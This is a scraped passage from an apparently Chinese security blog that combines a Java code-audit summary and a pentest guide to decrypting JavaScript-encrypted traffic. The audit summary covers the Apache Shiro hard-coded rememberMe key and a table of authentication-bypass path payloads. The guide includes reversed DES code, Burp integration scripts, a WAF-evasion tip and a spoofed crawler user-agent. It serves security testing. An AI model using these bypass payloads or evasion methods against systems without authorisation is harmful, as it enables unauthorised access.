id=\"前言\"\u003e前言\u003c/h1\u003e\n\u003cp\u003eJava安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。\u003c/p\u003e\n\u003ch1 id=\"常见组件漏洞\"\u003e常见组件漏洞\u003c/h1\u003e\n\u003ch2 id=\"1shiro\"\u003e1、Shiro\u003c/h2\u003e\n\u003cp\u003eshiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：\u003c/p\u003e\n\u003ch3 id=\"硬编码\"\u003e硬编码：\u003c/h3\u003e\n\u003cp\u003e硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esecurityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager()\n\n关键词：setRememberMeManager\n\n具体实现：\npublic CookieRememberMeManager rememberMeManager()  \n{  \n    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();  \n    cookieRememberMeManager.setCookie(rememberMeCookie());  \n    cookieRememberMeManager.setCipherKey(Base64.decode(\u0026#34;fCq+/xW488hMTCD+cmJ3aQ==\u0026#34;));  \n    return cookieRememberMeManager;  \n}\n\n搜索密钥关键词：setCipherKey\n\nshiro还可以通过配置文件的方式进行配置，同样可以搜索关键词：\norg.apache.shiro.web.mgt.DefaultWebSecurityManager\norg.apache.shiro.web.mgt.CookieRememberMeManager\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e案例：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/dmsj_img/Pasted%20image%2020241210212625.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/dmsj_img/Pasted%20image%2020241210212644.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/dmsj_img/Pasted%20image%2020241210212700.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/dmsj_img/Pasted%20image%2020241210212952.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"权限绕过\"\u003e权限绕过：\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth style=\"text-align: left\"\u003eCVE\u003c/th\u003e\n          \u003cth style=\"text-align: left\"\u003e描述\u003c/th\u003e\n          \u003cth style=\"text-align: left\"\u003e影响范围\u003c/th\u003e\n          \u003cth style=\"text-align: left\"\u003epayload\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: left\"\u003eCVE-2020-1957\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e权限绕过\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003eShiro \u0026lt; 1.5.2\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e/xxx/..;/admin/\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: left\"\u003eCVE-2020-11989\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003eCVE-2020-1957补丁绕过\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003eShiro \u0026lt; 1.5.3\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e/;/admin/page\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: left\"\u003eCVE-2020-13933\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003eCVE-2020-11989补丁绕过\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003eShiro \u0026lt; 1.6.0\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e/admin/%3bpage\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: left\"\u003eCVE-2020-17523\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e权限绕过\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003eShiro \u0026lt; 1.7.1\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e/admin/%20  \u003c!-- raw HTML omitted --\u003e/admin/%2e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd style=\"text-align: left\"\u003eshiro配置路径匿名访问的方法大概如下：\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e\u003c/td\u003e\n          \u003ctd style=\"text-align: left\"\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e1、集中配置\u003c/p\u003e","title":"代码审计总结"},{"content":"前言 实战渗透项目很多时候都能遇到数据包加密的情况，很多时候会觉得棘手，因为很多改包的动作无法实现，但是这样不完全是坏处，特别是一些参数加密的时候，由于数据包加密，所以他们天然存在WAF绕过，将我们的payload加入JS加密的文本中传输，WAF几乎很难识别。\n目前有两种解决方案，一种是扣JS代码，获取所有的加密函数，中间很容易遇到函数嵌套，陷入扣代码的困局，还有一种是JS-RPC的解决方案，详情可以参考：\nhttps://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmODRrzc6LK%3D63x#toc-2 JS-RPC，详情查看使用方式配合上文食用：\nhttps://github.com/jxhczhl/JsRpc 简单记录一些遇到的网站，以及如何配合burp插件，方便我们进行渗透：\n一、常规扣代码解密 返回数据包中带有encrypt_data：\n浏览器ctrl+shift+f搜索encrypt_data，找到对应的JS代码文件，找到符合要求的，必须为某方法，全部包含该参数的，而非只取某个值，打上断点可以看URL是否正确，以及参数是否对应：\n控制台再次确认参数是否找正确了：\n源码里面点进去，找到相关函数：\n把相关的内容放到本地进行调试：\n这里出现错误，W未定义：\n把W也复制过来：\n继续把J也复制过来，中间还会遇到好几个函数缺失，都复制过来即可：\n这里就算是逆向完成了，接下来就要做代码层面的嵌入了，用python的execjs库即可：\npip install pyexecjs2\ndemo01.py\nimport requests\rimport execjs\rheaders = {\r\u0026#39;accept\u0026#39;: \u0026#39;application/json, text/plain, */*\u0026#39;,\r\u0026#39;accept-language\u0026#39;: \u0026#39;zh-CN\u0026#39;,\r\u0026#39;cache-control\u0026#39;: \u0026#39;no-cache\u0026#39;,\r\u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;,\r\u0026#39;origin\u0026#39;: \u0026#39;https://rxxx\u0026#39;,\r\u0026#39;pragma\u0026#39;: \u0026#39;no-cache\u0026#39;,\r\u0026#39;priority\u0026#39;: \u0026#39;u=1, i\u0026#39;,\r\u0026#39;referer\u0026#39;: \u0026#39;https://xxx/\u0026#39;,\r\u0026#39;sec-fetch-dest\u0026#39;: \u0026#39;empty\u0026#39;,\r\u0026#39;sec-fetch-mode\u0026#39;: \u0026#39;cors\u0026#39;,\r\u0026#39;sec-fetch-site\u0026#39;: \u0026#39;cross-site\u0026#39;,\r\u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/5.0Â\\xa0(compatible;Â\\xa0Baiduspider-render/2.0;Â\\xa0+http://www.baidu.com/search/spider.html)\u0026#39;,\r}\rdata = {\r\u0026#39;page\u0026#39;: \u0026#39;1\u0026#39;,\r\u0026#39;num\u0026#39;: \u0026#39;8\u0026#39;,\r\u0026#39;type\u0026#39;: \u0026#39;榜单\u0026#39;,\r}\rresponse = requests.post(\u0026#39;https://xxxn/web/webSiteCaNews\u0026#39;, headers=headers, data=data)\rencrypt_data= response.json()[\u0026#39;encrypt_data\u0026#39;]\rprint(encrypt_data)\rdecrypt = execjs.compile(open(\u0026#39;./demo01.js\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;).read()).call(\u0026#39;Z\u0026#39;,encrypt_data)\rprint(decrypt) demo01.js\nfunction X(f) {\rfor (var c = new Array(0,4,536870912,536870916,65536,65540,536936448,536936452,512,516,536871424,536871428,66048,66052,536936960,536936964), s = new Array(0,1,1048576,1048577,67108864,67108865,68157440,68157441,256,257,1048832,1048833,67109120,67109121,68157696,68157697), v = new Array(0,8,2048,2056,16777216,16777224,16779264,16779272,0,8,2048,2056,16777216,16777224,16779264,16779272), C = new Array(0,2097152,134217728,136314880,8192,2105344,134225920,136323072,131072,2228224,134348800,136445952,139264,2236416,134356992,136454144), h = new Array(0,262144,16,262160,0,262144,16,262160,4096,266240,4112,266256,4096,266240,4112,266256), m = new Array(0,1024,32,1056,0,1024,32,1056,33554432,33555456,33554464,33555488,33554432,33555456,33554464,33555488), F = new Array(0,268435456,524288,268959744,2,268435458,524290,268959746,0,268435456,524288,268959744,2,268435458,524290,268959746), w = new Array(0,65536,2048,67584,536870912,536936448,536872960,536938496,131072,196608,133120,198656,537001984,537067520,537004032,537069568), R = new Array(0,262144,0,262144,2,262146,2,262146,33554432,33816576,33554432,33816576,33554434,33816578,33554434,33816578), _ = new Array(0,268435456,8,268435464,0,268435456,8,268435464,1024,268436480,1032,268436488,1024,268436480,1032,268436488), j = new Array(0,32,0,32,1048576,1048608,1048576,1048608,8192,8224,8192,8224,1056768,1056800,1056768,1056800), b = new Array(0,16777216,512,16777728,2097152,18874368,2097664,18874880,67108864,83886080,67109376,83886592,69206016,85983232,69206528,85983744), S = new Array(0,4096,134217728,134221824,524288,528384,134742016,134746112,16,4112,134217744,134221840,524304,528400,134742032,134746128), t = new Array(0,4,256,260,0,4,256,260,1,5,257,261,1,5,257,261), n = f.length \u0026gt; 8 ? 3 : 1, i = new Array(32 * n), A = new Array(0,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0), r, p, d = 0, e = 0, x, l = 0; l \u0026lt; n; l++) {\rvar o = f.charCodeAt(d++) \u0026lt;\u0026lt; 24 | f.charCodeAt(d++) \u0026lt;\u0026lt; 16 | f.charCodeAt(d++) \u0026lt;\u0026lt; 8 | f.charCodeAt(d++)\r, a = f.charCodeAt(d++) \u0026lt;\u0026lt; 24 | f.charCodeAt(d++) \u0026lt;\u0026lt; 16 | f.charCodeAt(d++) \u0026lt;\u0026lt; 8 | f.charCodeAt(d++);\rx = (o \u0026gt;\u0026gt;\u0026gt; 4 ^ a) \u0026amp; 252645135,\ra ^= x,\ro ^= x \u0026lt;\u0026lt; 4,\rx = (a \u0026gt;\u0026gt;\u0026gt; -16 ^ o) \u0026amp; 65535,\ro ^= x,\ra ^= x \u0026lt;\u0026lt; -16,\rx = (o \u0026gt;\u0026gt;\u0026gt; 2 ^ a) \u0026amp; 858993459,\ra ^= x,\ro ^= x \u0026lt;\u0026lt; 2,\rx = (a \u0026gt;\u0026gt;\u0026gt; -16 ^ o) \u0026amp; 65535,\ro ^= x,\ra ^= x \u0026lt;\u0026lt; -16,\rx = (o \u0026gt;\u0026gt;\u0026gt; 1 ^ a) \u0026amp; 1431655765,\ra ^= x,\ro ^= x \u0026lt;\u0026lt; 1,\rx = (a \u0026gt;\u0026gt;\u0026gt; 8 ^ o) \u0026amp; 16711935,\ro ^= x,\ra ^= x \u0026lt;\u0026lt; 8,\rx = (o \u0026gt;\u0026gt;\u0026gt; 1 ^ a) \u0026amp; 1431655765,\ra ^= x,\ro ^= x \u0026lt;\u0026lt; 1,\rx = o \u0026lt;\u0026lt; 8 | a \u0026gt;\u0026gt;\u0026gt; 20 \u0026amp; 240,\ro = a \u0026lt;\u0026lt; 24 | a \u0026lt;\u0026lt; 8 \u0026amp; 16711680 | a \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 65280 | a \u0026gt;\u0026gt;\u0026gt; 24 \u0026amp; 240,\ra = x;\rfor (var u = 0; u \u0026lt; A.length; u++)\rA[u] ? (o = o \u0026lt;\u0026lt; 2 | o \u0026gt;\u0026gt;\u0026gt; 26,\ra = a \u0026lt;\u0026lt; 2 | a \u0026gt;\u0026gt;\u0026gt; 26) : (o = o \u0026lt;\u0026lt; 1 | o \u0026gt;\u0026gt;\u0026gt; 27,\ra = a \u0026lt;\u0026lt; 1 | a \u0026gt;\u0026gt;\u0026gt; 27),\ro \u0026amp;= -15,\ra \u0026amp;= -15,\rr = c[o \u0026gt;\u0026gt;\u0026gt; 28] | s[o \u0026gt;\u0026gt;\u0026gt; 24 \u0026amp; 15] | v[o \u0026gt;\u0026gt;\u0026gt; 20 \u0026amp; 15] | C[o \u0026gt;\u0026gt;\u0026gt; 16 \u0026amp; 15] | h[o \u0026gt;\u0026gt;\u0026gt; 12 \u0026amp; 15] | m[o \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 15] | F[o \u0026gt;\u0026gt;\u0026gt; 4 \u0026amp; 15],\rp = w[a \u0026gt;\u0026gt;\u0026gt; 28] | R[a \u0026gt;\u0026gt;\u0026gt; 24 \u0026amp; 15] | _[a \u0026gt;\u0026gt;\u0026gt; 20 \u0026amp; 15] | j[a \u0026gt;\u0026gt;\u0026gt; 16 \u0026amp; 15] | b[a \u0026gt;\u0026gt;\u0026gt; 12 \u0026amp; 15] | S[a \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 15] | t[a \u0026gt;\u0026gt;\u0026gt; 4 \u0026amp; 15],\rx = (p \u0026gt;\u0026gt;\u0026gt; 16 ^ r) \u0026amp; 65535,\ri[e++] = r ^ x,\ri[e++] = p ^ x \u0026lt;\u0026lt; 16\r}\rreturn i\r}\rvar T = {\rexports: {}\r};\rvar h = typeof global == \u0026#34;object\u0026#34; \u0026amp;\u0026amp; global;\r(function(f, c) {\r(function(s) {\rvar v = c\r, C = f \u0026amp;\u0026amp; f.exports == v \u0026amp;\u0026amp; f\r, h = typeof P == \u0026#34;object\u0026#34; \u0026amp;\u0026amp; P;\r(h.global === h || h.window === h) \u0026amp;\u0026amp; (s = h);\rvar m = function(t) {\rthis.message = t\r};\rm.prototype = new Error,\rm.prototype.name = \u0026#34;InvalidCharacterError\u0026#34;;\rvar F = function(t) {\rthrow new m(t)\r}\r, w = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;\r, R = /[\\t\\n\\f\\r ]/g\r, _ = function(t) {\rt = String(t).replace(R, \u0026#34;\u0026#34;);\rvar n = t.length;\rn % 4 == 0 \u0026amp;\u0026amp; (t = t.replace(/==?$/, \u0026#34;\u0026#34;),\rn = t.length),\r(n % 4 == 1 || /[^+a-zA-Z0-9/]/.test(t)) \u0026amp;\u0026amp; F(\u0026#34;Invalid character: the string to be decoded is not correctly encoded.\u0026#34;);\rfor (var i = 0, A, r, p = \u0026#34;\u0026#34;, d = -1; ++d \u0026lt; n; )\rr = w.indexOf(t.charAt(d)),\rA = i % 4 ? A * 64 + r : r,\ri++ % 4 \u0026amp;\u0026amp; (p += String.fromCharCode(255 \u0026amp; A \u0026gt;\u0026gt; (-2 * i \u0026amp; 6)));\rreturn p\r}\r, j = function(t) {\rt = String(t),\r/[^\\0-\\xFF]/.test(t) \u0026amp;\u0026amp; F(\u0026#34;The string to be encoded contains characters outside of the Latin1 range.\u0026#34;);\rfor (var n = t.length % 3, i = \u0026#34;\u0026#34;, A = -1, r, p, d, e, x = t.length - n; ++A \u0026lt; x; )\rr = t.charCodeAt(A) \u0026lt;\u0026lt; 16,\rp = t.charCodeAt(++A) \u0026lt;\u0026lt; 8,\rd = t.charCodeAt(++A),\re = r + p + d,\ri += w.charAt(e \u0026gt;\u0026gt; 18 \u0026amp; 63) + w.charAt(e \u0026gt;\u0026gt; 12 \u0026amp; 63) + w.charAt(e \u0026gt;\u0026gt; 6 \u0026amp; 63) + w.charAt(e \u0026amp; 63);\rreturn n == 2 ? (r = t.charCodeAt(A) \u0026lt;\u0026lt; 8,\rp = t.charCodeAt(++A),\re = r + p,\ri += w.charAt(e \u0026gt;\u0026gt; 10) + w.charAt(e \u0026gt;\u0026gt; 4 \u0026amp; 63) + w.charAt(e \u0026lt;\u0026lt; 2 \u0026amp; 63) + \u0026#34;=\u0026#34;) : n == 1 \u0026amp;\u0026amp; (e = t.charCodeAt(A),\ri += w.charAt(e \u0026gt;\u0026gt; 2) + w.charAt(e \u0026lt;\u0026lt; 4 \u0026amp; 63) + \u0026#34;==\u0026#34;),\ri\r}\r, b = {\rencode: j,\rdecode: _,\rversion: \u0026#34;1.0.0\u0026#34;\r};\rif (v \u0026amp;\u0026amp; !v.nodeType)\rif (C)\rC.exports = b;\relse\rfor (var S in b)\rb.hasOwnProperty(S) \u0026amp;\u0026amp; (v[S] = b[S]);\relse\rs.base64 = b\r}\r)(global)\r}\r)(T, T.exports);\rconst J = T.exports;\rfunction Z(f) {\rreturn JSON.parse(W(\u0026#34;sjdqmp20161205#_316@gfmt\u0026#34;, J.decode(f), 0, 0, \u0026#34;012345677890123\u0026#34;, 1))\r}\rfunction W(f, c, s, v, C, h) {\rvar m = new Array(16843776,0,65536,16843780,16842756,66564,4,65536,1024,16843776,16843780,1024,16778244,16842756,16777216,4,1028,16778240,16778240,66560,66560,16842752,16842752,16778244,65540,16777220,16777220,65540,0,1028,66564,16777216,65536,16843780,4,16842752,16843776,16777216,16777216,1024,16842756,65536,66560,16777220,1024,4,16778244,66564,16843780,65540,16842752,16778244,16777220,1028,66564,16843776,1028,16778240,16778240,0,65540,66560,0,16842756), F = new Array(-2146402272,-2147450880,32768,1081376,1048576,32,-2146435040,-2147450848,-2147483616,-2146402272,-2146402304,-2147483648,-2147450880,1048576,32,-2146435040,1081344,1048608,-2147450848,0,-2147483648,32768,1081376,-2146435072,1048608,-2147483616,0,1081344,32800,-2146402304,-2146435072,32800,0,1081376,-2146435040,1048576,-2147450848,-2146435072,-2146402304,32768,-2146435072,-2147450880,32,-2146402272,1081376,32,32768,-2147483648,32800,-2146402304,1048576,-2147483616,1048608,-2147450848,-2147483616,1048608,1081344,0,-2147450880,32800,-2147483648,-2146435040,-2146402272,1081344), w = new Array(520,134349312,0,134348808,134218240,0,131592,134218240,131080,134217736,134217736,131072,134349320,131080,134348800,520,134217728,8,134349312,512,131584,134348800,134348808,131592,134218248,131584,131072,134218248,8,134349320,512,134217728,134349312,134217728,131080,520,131072,134349312,134218240,0,512,131080,134349320,134218240,134217736,512,0,134348808,134218248,131072,134217728,134349320,8,131592,131584,134217736,134348800,134218248,520,134348800,131592,8,134348808,131584), R = new Array(8396801,8321,8321,128,8396928,8388737,8388609,8193,0,8396800,8396800,8396929,129,0,8388736,8388609,1,8192,8388608,8396801,128,8388608,8193,8320,8388737,1,8320,8388736,8192,8396928,8396929,129,8388736,8388609,8396800,8396929,129,0,0,8396800,8320,8388736,8388737,1,8396801,8321,8321,128,8396929,129,1,8192,8388609,8193,8396928,8388737,8193,8320,8388608,8396801,128,8388608,8192,8396928), _ = new Array(256,34078976,34078720,1107296512,524288,256,1073741824,34078720,1074266368,524288,33554688,1074266368,1107296512,1107820544,524544,1073741824,33554432,1074266112,1074266112,0,1073742080,1107820800,1107820800,33554688,1107820544,1073742080,0,1107296256,34078976,33554432,1107296256,524544,524288,1107296512,256,33554432,1073741824,34078720,1107296512,1074266368,33554688,1073741824,1107820544,34078976,1074266368,256,33554432,1107820544,1107820800,524544,1107296256,1107820800,34078720,0,1074266112,1107296256,524544,33554688,1073742080,524288,0,1074266112,34078976,1073742080), j = new Array(536870928,541065216,16384,541081616,541065216,16,541081616,4194304,536887296,4210704,4194304,536870928,4194320,536887296,536870912,16400,0,4194320,536887312,16384,4210688,536887312,16,541065232,541065232,0,4210704,541081600,16400,4210688,541081600,536870912,536887296,16,541065232,4210688,541081616,4194304,16400,536870928,4194304,536887296,536870912,16400,536870928,541081616,4210688,541065216,4210704,541081600,0,541065232,16,16384,541065216,4210704,16384,4194320,536887312,0,541081600,536870912,4194320,536887312), b = new Array(2097152,69206018,67110914,0,2048,67110914,2099202,69208064,69208066,2097152,0,67108866,2,67108864,69206018,2050,67110912,2099202,2097154,67110912,67108866,69206016,69208064,2097154,69206016,2048,2050,69208066,2099200,2,67108864,2099200,67108864,2099200,2097152,67110914,67110914,69206018,69206018,2,2097154,67108864,67110912,2097152,69208064,2050,2099202,69208064,2050,67108866,69208066,69206016,2099200,0,2,69208066,0,2099202,69206016,2048,67108866,67110912,2048,2097154), S = new Array(268439616,4096,262144,268701760,268435456,268439616,64,268435456,262208,268697600,268701760,266240,268701696,266304,4096,64,268697600,268435520,268439552,4160,266240,262208,268697664,268701696,4160,0,0,268697664,268435520,268439552,266304,262144,266304,262144,268701696,4096,64,268697664,4096,266304,268439552,64,268435520,268697600,268697664,268435456,262144,268439616,0,268701760,262208,268435520,268697600,268439552,268439616,0,268701760,266240,266240,4160,4160,262208,268435456,268701696), t = X(f), n = 0, i, A, r, p, d, e, x, l, o, a, u, G, M, N, E = c.length, q = 0, U = t.length == 32 ? 3 : 9;\rU == 3 ? l = s ? new Array(0,32,2) : new Array(30,-2,-2) : l = s ? new Array(0,32,2,62,30,-2,64,96,2) : new Array(94,62,-2,32,64,2,30,-2,-2),\rh == 2 ? c += \u0026#34; \u0026#34; : h == 1 ? s \u0026amp;\u0026amp; (r = 8 - E % 8,\rc += String.fromCharCode(r, r, r, r, r, r, r, r),\rr === 8 \u0026amp;\u0026amp; (E += 8)) : h || (c += \u0026#34;\\0\\0\\0\\0\\0\\0\\0\\0\u0026#34;);\rvar y = \u0026#34;\u0026#34;\r, I = \u0026#34;\u0026#34;;\rfor (v == 1 \u0026amp;\u0026amp; (o = C.charCodeAt(n++) \u0026lt;\u0026lt; 24 | C.charCodeAt(n++) \u0026lt;\u0026lt; 16 | C.charCodeAt(n++) \u0026lt;\u0026lt; 8 | C.charCodeAt(n++),\ru = C.charCodeAt(n++) \u0026lt;\u0026lt; 24 | C.charCodeAt(n++) \u0026lt;\u0026lt; 16 | C.charCodeAt(n++) \u0026lt;\u0026lt; 8 | C.charCodeAt(n++),\rn = 0); n \u0026lt; E; ) {\rfor (e = c.charCodeAt(n++) \u0026lt;\u0026lt; 24 | c.charCodeAt(n++) \u0026lt;\u0026lt; 16 | c.charCodeAt(n++) \u0026lt;\u0026lt; 8 | c.charCodeAt(n++),\rx = c.charCodeAt(n++) \u0026lt;\u0026lt; 24 | c.charCodeAt(n++) \u0026lt;\u0026lt; 16 | c.charCodeAt(n++) \u0026lt;\u0026lt; 8 | c.charCodeAt(n++),\rv == 1 \u0026amp;\u0026amp; (s ? (e ^= o,\rx ^= u) : (a = o,\rG = u,\ro = e,\ru = x)),\rr = (e \u0026gt;\u0026gt;\u0026gt; 4 ^ x) \u0026amp; 252645135,\rx ^= r,\re ^= r \u0026lt;\u0026lt; 4,\rr = (e \u0026gt;\u0026gt;\u0026gt; 16 ^ x) \u0026amp; 65535,\rx ^= r,\re ^= r \u0026lt;\u0026lt; 16,\rr = (x \u0026gt;\u0026gt;\u0026gt; 2 ^ e) \u0026amp; 858993459,\re ^= r,\rx ^= r \u0026lt;\u0026lt; 2,\rr = (x \u0026gt;\u0026gt;\u0026gt; 8 ^ e) \u0026amp; 16711935,\re ^= r,\rx ^= r \u0026lt;\u0026lt; 8,\rr = (e \u0026gt;\u0026gt;\u0026gt; 1 ^ x) \u0026amp; 1431655765,\rx ^= r,\re ^= r \u0026lt;\u0026lt; 1,\re = e \u0026lt;\u0026lt; 1 | e \u0026gt;\u0026gt;\u0026gt; 31,\rx = x \u0026lt;\u0026lt; 1 | x \u0026gt;\u0026gt;\u0026gt; 31,\rA = 0; A \u0026lt; U; A += 3) {\rfor (M = l[A + 1],\rN = l[A + 2],\ri = l[A]; i != M; i += N)\rp = x ^ t[i],\rd = (x \u0026gt;\u0026gt;\u0026gt; 4 | x \u0026lt;\u0026lt; 28) ^ t[i + 1],\rr = e,\re = x,\rx = r ^ (F[p \u0026gt;\u0026gt;\u0026gt; 24 \u0026amp; 63] | R[p \u0026gt;\u0026gt;\u0026gt; 16 \u0026amp; 63] | j[p \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 63] | S[p \u0026amp; 63] | m[d \u0026gt;\u0026gt;\u0026gt; 24 \u0026amp; 63] | w[d \u0026gt;\u0026gt;\u0026gt; 16 \u0026amp; 63] | _[d \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 63] | b[d \u0026amp; 63]);\rr = e,\re = x,\rx = r\r}\re = e \u0026gt;\u0026gt;\u0026gt; 1 | e \u0026lt;\u0026lt; 31,\rx = x \u0026gt;\u0026gt;\u0026gt; 1 | x \u0026lt;\u0026lt; 31,\rr = (e \u0026gt;\u0026gt;\u0026gt; 1 ^ x) \u0026amp; 1431655765,\rx ^= r,\re ^= r \u0026lt;\u0026lt; 1,\rr = (x \u0026gt;\u0026gt;\u0026gt; 8 ^ e) \u0026amp; 16711935,\re ^= r,\rx ^= r \u0026lt;\u0026lt; 8,\rr = (x \u0026gt;\u0026gt;\u0026gt; 2 ^ e) \u0026amp; 858993459,\re ^= r,\rx ^= r \u0026lt;\u0026lt; 2,\rr = (e \u0026gt;\u0026gt;\u0026gt; 16 ^ x) \u0026amp; 65535,\rx ^= r,\re ^= r \u0026lt;\u0026lt; 16,\rr = (e \u0026gt;\u0026gt;\u0026gt; 4 ^ x) \u0026amp; 252645135,\rx ^= r,\re ^= r \u0026lt;\u0026lt; 4,\rv == 1 \u0026amp;\u0026amp; (s ? (o = e,\ru = x) : (e ^= a,\rx ^= G)),\rI += String.fromCharCode(e \u0026gt;\u0026gt;\u0026gt; 24, e \u0026gt;\u0026gt;\u0026gt; 16 \u0026amp; 255, e \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 255, e \u0026amp; 255, x \u0026gt;\u0026gt;\u0026gt; 24, x \u0026gt;\u0026gt;\u0026gt; 16 \u0026amp; 255, x \u0026gt;\u0026gt;\u0026gt; 8 \u0026amp; 255, x \u0026amp; 255),\rq += 8,\rq == 512 \u0026amp;\u0026amp; (y += I,\rI = \u0026#34;\u0026#34;,\rq = 0)\r}\rif (y += I,\ry = y.replace(/\\0*$/g, \u0026#34;\u0026#34;),\r!s) {\rif (h === 1) {\rvar E = y.length\r, O = 0;\rE \u0026amp;\u0026amp; (O = y.charCodeAt(E - 1)),\rO \u0026lt;= 8 \u0026amp;\u0026amp; (y = y.substring(0, E - O))\r}\ry = decodeURIComponent(escape(y))\r}\rreturn y\r}\r// encrypt_data =\u0026#39;\u0026#39;\r//\r// console.log(Z(encrypt_data)) 这样就基本实现了相关的功能，作为渗透测试人员来说，当然不希望使用pycharm进行渗透，接下来就是集成到burp中去了：\n这里使用autoDecoder插件来实现：\n少量修改demo的代码：\nfrom flask import Flask\rimport execjs\rfrom flask import request\rimport json\rapp = Flask(__name__)\r@app.route(\u0026#39;/encode\u0026#39;,methods=[\u0026#34;POST\u0026#34;])\rdef encrypt():\rparam = request.form.get(\u0026#39;dataBody\u0026#39;) # 获取 post 参数\rprint(param)\rreturn param\r@app.route(\u0026#39;/decode\u0026#39;,methods=[\u0026#34;POST\u0026#34;]) # 解密\rdef decrypt():\rparam = request.form.get(\u0026#39;dataBody\u0026#39;) # 获取 post 参数\rdata = json.loads(param)\rencrypt_data = data.get(\u0026#39;encrypt_data\u0026#39;, None)\rprint(encrypt_data)\rdecrypt = execjs.compile(open(\u0026#39;./demo01.js\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;).read()).call(\u0026#39;Z\u0026#39;,encrypt_data)\rreturn decrypt\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.debug = True # 设置调试模式，生产模式的时候要关掉debug\rapp.run(host=\u0026#34;0.0.0.0\u0026#34;, port=8888) 测试：\n随后在相关模块中就可以直接看到对应的明文了：\n这种方法看起来比较完美了，但是仍然会有一些较为麻烦的地方，比如这里使用的是execjs框架执行指定的JS代码，理想状态是好的。 但是 ，如果目标环境的加密很复杂，想要写出这种代码就会非常困难，但是项目中很难给这么多时间调试，所以需要另外一个比较快速的方案。\n二、JS-RPC 扣JS代码实在是太麻烦了，JS-RPC采用了直接调用的方式解决加解密的问题，就可以规避手动扣代码，使用方法参考上面的教程，这里记录如何和autodecoder联动：\n这是JS-RPC的服务端：\nhttp://127.0.0.1:12080/go?group=zzz\u0026amp;action=enc\u0026amp;param=asdasd 使用autodecoder来进行嵌入加密了：\nencryptdata.py\nimport json import urllib import requests def encrypt_data(data): url = json.dumps(data) url = urllib.parse.quote(url) url = \u0026#39;http://127.0.0.1:12080/go?group=zzz\u0026amp;action=enc\u0026amp;param=\u0026#39;+url print(url) response = requests.get(url) data = response.json() encryptdata = data.get(\u0026#34;data\u0026#34;) print(encryptdata) return encryptdata demo.py\n# -*- coding:utf-8 -*- from flask import Flask, request import re from encryptdata import encrypt_data app = Flask(__name__) @app.route(\u0026#39;/encode\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) # 不要修改 不要修改 不要修改 永远都是POST获取参数，不管源数据包GET方法还是POST方法 def encrypt(): body = request.form.get(\u0026#39;dataBody\u0026#39;) # 获取 post 参数 必需必需必需 获取数据包内body的内容 #headers = request.form.get(\u0026#39;dataHeaders\u0026#39;) # 获取 post 参数 可选 获取数据包内的数据头，需要勾选\u0026lt;对数据头进行处理\u0026gt;按钮 #reqresp = request.form.get(\u0026#39;requestorresponse\u0026#39;) # 获取 requestorresponse 参数 可选 